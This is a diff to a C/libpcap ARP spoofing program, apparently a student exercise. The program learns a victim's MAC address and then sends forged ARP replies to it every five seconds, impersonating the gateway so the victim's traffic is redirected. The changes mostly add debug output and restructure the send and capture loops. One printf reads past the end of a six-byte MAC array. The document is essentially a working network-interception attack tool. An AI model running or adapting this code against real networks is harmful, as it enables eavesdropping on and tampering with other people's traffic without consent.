@@ -32,16 +32,6 @@ typedef struct Ethernet_Header {
 	unsigned char type[4];	
 } EthHeader;
 
-
-/*
-unsigned char own_IP[4];
-unsigned char gw_IP[4];
-unsigned char victim_IP[4];
-unsigned char victim_MACaddr[6];
-unsigned char gw_MACaddr[6];
-unsigned char own_MACaddr[6];
-unsigned char broadcastMAC[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
-*/
 int Ethernet_Header_Parsing (const u_char * packet, EthHeader * ethheader){
 	int i;
 
@@ -79,7 +69,7 @@ int gw_IP_Parsing (const unsigned char * gw_IP) {
 		dup2(arp_pipe[1], 1);	// copy pipe for write to stdout
 		close(arp_pipe[0]);		// close for-read fd
 		close(arp_pipe[1]);
-		system("/usr/sbin/netstat -n -r | grep default | awk '{print $2}'");
+		system("/usr/sbin/netstat -n -r | grep default | awk '{print $2}'");	//In MAC OS, gate
 	}
 
 	else {
@@ -145,7 +135,7 @@ int own_MAC_Parsing (const unsigned char * own_MACaddr) {
 		dup2(arp_pipe[1], 1);	// copy pipe for write to stdout
 		close(arp_pipe[0]);		// close for-read fd
 		close(arp_pipe[1]);
-		system("/sbin/ifconfig -a | grep ether | awk '{print $2}'");
+		system("/sbin/ifconfig -a | grep ether | awk '{print $2}'");	// program's 
 	}
 
 	else {
@@ -163,8 +153,7 @@ int Make_ARP_Packet (unsigned char * packet, unsigned char * senderMAC, unsigned
 	int i = 0;
 	int curAddr = 0;
 	
-	//Constructing Ethernet Header
-	
+	//Constructing Ethernet Header	
 	memcpy(&packet[curAddr], targetMAC, ETHER_MACADDR_SIZE);	
 	curAddr += ETHER_MACADDR_SIZE;
 	
@@ -294,28 +283,42 @@ int main (int argc, char * argv[]) {
 	}
 	printf("\n");
 
-	pcap_sendpacket(pcd, arp_packet, sizeof(arp_packet));	//returns 0 if success
-	/*
-	for (i = 0; i < 4; i++)
-		printf("...\n");
-	*/
 	while (1) {
 		//packet
+		pcap_sendpacket(pcd, arp_packet, sizeof(arp_packet));	//returns 0 if success
+		for (i = 0; i < sizeof(arp_packet); i++) {
+			if (i == 0)				printf("%02X ",   arp_packet[0]);
+			else if ((i % 16) == 0)	printf("\n%02X ", arp_packet[i]);
+			else if ((i % 8) == 0)	printf(" %02X ",  arp_packet[i]);
+			else 					printf("%02X ",   arp_packet[i]);
+		}	
+		printf("\n");
 
+		printf("capturing...\n");
 		packet = pcap_next(pcd, &header);
-		printf("...\n");
+
+		
 		if (packet == NULL)	//if packet is NULL, continue
 			continue;
-		printf("...\n");
+
 		Ethernet_Header_Parsing(packet, &ethheader);
 
 		if (ntohs(*((unsigned short *)ethheader.type)) != ETHER_PROTO_ARP) 
 			continue;
 
-		if ( memcmp(&packet[28], victim_IP, 4) == 0) {
+		printf("ARP Analyzing...\n");
+		
+		for (i = 0; i < 4; i++)
+			printf("%02x ", packet[28+i]);
+		printf("\n");
 
+		for (i = 0; i < 4; i++)
+			printf("%02x ", victim_IP[i]);
+		printf("\n");
+
+		if ( memcmp(&packet[28], victim_IP, 4) == 0) {
 			memcpy(victim_MACaddr, ethheader.srcMACaddr, 6);
-			printf("victim_MAC address is : "); //%02x:%02x:%02x:%02x:%02x:%02x\n", victim_MACaddr[0], victim_MACaddr[1], victim_MACaddr[2], victim_MACaddr[3], victim_MACaddr[4], victim_MACaddr[5],victim_MACaddr[6]);
+			printf("victim_MAC address is : %02x:%02x:%02x:%02x:%02x:%02x\n", victim_MACaddr[0], victim_MACaddr[1], victim_MACaddr[2], victim_MACaddr[3], victim_MACaddr[4], victim_MACaddr[5],victim_MACaddr[6]);
 			break;
 		}
 
@@ -325,7 +328,7 @@ int main (int argc, char * argv[]) {
 
 
 	while (1) {
-
+		printf("Sending ARP_REPLY packet...\n");
 		Make_ARP_Packet (arp_packet, own_MACaddr, gw_IP, victim_MACaddr, victim_IP, ARP_REPLY);		
 		pcap_sendpacket(pcd, arp_packet, sizeof(arp_packet));
 		sleep(5);
